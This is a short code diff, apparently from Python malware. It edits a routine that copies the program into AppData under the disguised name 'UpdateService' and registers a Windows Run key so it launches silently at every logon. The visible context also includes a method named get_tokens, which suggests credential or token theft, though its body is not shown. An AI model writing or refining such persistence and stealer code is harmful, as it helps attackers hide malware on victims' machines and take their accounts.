@@ -109,7 +109,7 @@ class main():
 		try: self.system("powershell Get-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name UpdateService")
 		except:
 			shutil.copytree(os.getcwd(), f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService')
-			self.system(f"powershell New-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateService' -value 'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService/{self.filename}' -PropertyType STRING")
+			self.system(fr"powershell New-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateService' -value 'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\UpdateService\{self.filename} -silent' -PropertyType STRING")
 		
 
 	def get_tokens(self, path):
